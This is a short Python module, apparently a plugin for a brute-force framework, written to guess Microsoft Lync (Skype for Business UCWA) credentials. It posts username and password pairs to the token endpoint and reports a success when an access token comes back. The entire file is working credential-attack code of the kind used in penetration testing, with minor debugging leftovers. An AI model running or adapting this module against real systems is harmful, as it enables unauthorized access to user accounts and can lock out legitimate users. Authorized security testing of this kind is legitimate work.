#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
from re import search
import requests
from bfg.shortcuts.http import HTTPModule
import pdb

class Module(HTTPModule):

    description = brief_description = 'Brute force Microsoft Lync.'
    # Details expected request/response: https://docs.microsoft.com/en-us/skype-sdk/ucwa/authenticationinucwa
    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]

    def __call__(self, username, password, *args, **kwargs):


        # post data
        data = {
            'grant_type':'password',
            'username':username,
            'password':password
        }

        print(self.headers)

        # make the request
        resp = requests.post(self.url,
                data=data,
                headers=self.headers,
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies)
    
        # verify credentials and return outcome
        '''
        HTTP/1.1 200 OK
        Content-Type: application/json;charset=UTF-8
        {
            "access_token":"cwt=2YotnFZFEjr1zCsicMWpAA...",
            "token_type":"Bearer",
            "expires_in":3600
        }
        '''

        if resp.status_code == 200 and resp.json()['access_token']:
            return dict(outcome=1, username=username, password=password)
        else:
            return dict(outcome=0, username=username, password=password)
